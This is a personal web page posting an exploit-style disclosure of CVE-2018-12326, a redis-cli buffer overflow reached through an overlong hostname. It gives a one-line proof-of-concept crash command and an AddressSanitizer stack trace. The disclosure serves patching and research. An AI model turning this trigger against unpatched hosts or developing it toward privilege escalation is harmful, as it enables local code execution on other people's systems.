<!DOCTYPE html>
<html lang="en">
<head>
    <title>Fakhri Zulkifli</title>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="blog, accent, , Fakhri Zulkifli, jekyll">
    <meta name="author" content="">
    
    
    
    <meta name="description" content="personal website">
    <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
    <link rel="alternate" type="application/rss+xml" title="Fakhri Zulkifli RSS" href="/feed.xml" />
    <link rel="stylesheet" href="http://localhost:4000/css/main.css">
    
    
    <!-- Facebook Open Graph -->
    <meta name="og:description" content="personal website">
    <meta name="og:title" content="Fakhri Zulkifli">
    <meta name="og:url" content="http://localhost:4000/CVE-2018-12326.html">
    <meta name="og:type" content="article">
    
    
    <!-- Twitter -->
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Fakhri Zulkifli">
    <meta name="twitter:description" content="personal website">
    <meta name="twitter:url" content="http://localhost:4000/CVE-2018-12326.html">
    
        <meta name="twitter:image" content="">
    
</head>
<body>
    <div class="wrapper">
        <div class="navbar container">
            <a id="author-name" class="alignable pull-left" href="http://localhost:4000">Fakhri Zulkifli</a>
            <ul class="alignable pull-right navbar-ul">
                
                    
                        <li class="alignable pull-right nav-list"><a target="_blank" href="resume.pdf">Resume</a>
                    
                    
                        </li>
                
                    
                        <li class="alignable pull-right nav-list"><a href="/">About</a>
                    
                    
                        /
                    
                        </li>
                
            </ul>
        </div>
        <div style="clear:both"></div>
        <hr>
        
            <div class="container content">
        
                <p>Exploit Title: Redis-cli Buffer Overflow<br />
Date: 2018-06-13<br />
Exploit Author: Fakhri Zulkifli (@d0lph1n98)<br />
Vendor Homepage: https://redis.io/<br />
Software Link: https://redis.io/download<br />
Version: 5.0, 4.0, 3.2<br />
Fixed on: 5.0, 4.0, 3.2<br />
CVE : CVE-2018-12326<br />
<br />
Buffer overflow in redis-cli of Redis version 3.2, 4.0, and 5.0 allows a local attacker to achieve code execution and escalate to higher privileges via a long string in the hostname parameter.<br />
<br />
$ ./src/redis-cli -h <code class="highlighter-rouge">python -c 'print "A" * 300'</code><br />
Could not connect to Redis at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:6379: Name or service not known<br />
<br />
#0 0x4a4182 in vsnprintf /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1566<br />
#1 0x4a42d0 in snprintf /home/user/llvm/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:1637<br />
#2 0x570159 in repl /home/user/redis/src/redis-cli.c:1624:5<br />
#3 0x55ba77 in main /home/user/redis/src/redis-cli.c:6660:9<br />
#4 0x7f6be5f6e82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291<br />
#5 0x4247a8 in _start (/home/user/redis/src/redis-cli+0x4247a8)<br />
<br />
References:<br /></p>
<ol>
  <li>https://raw.githubusercontent.com/antirez/redis/4.0/00-RELEASENOTES<br /></li>
  <li>https://raw.githubusercontent.com/antirez/redis/5.0/00-RELEASENOTES<br /></li>
</ol>

				
            </div>
    </div>
    
</body>
<footer>
</footer>
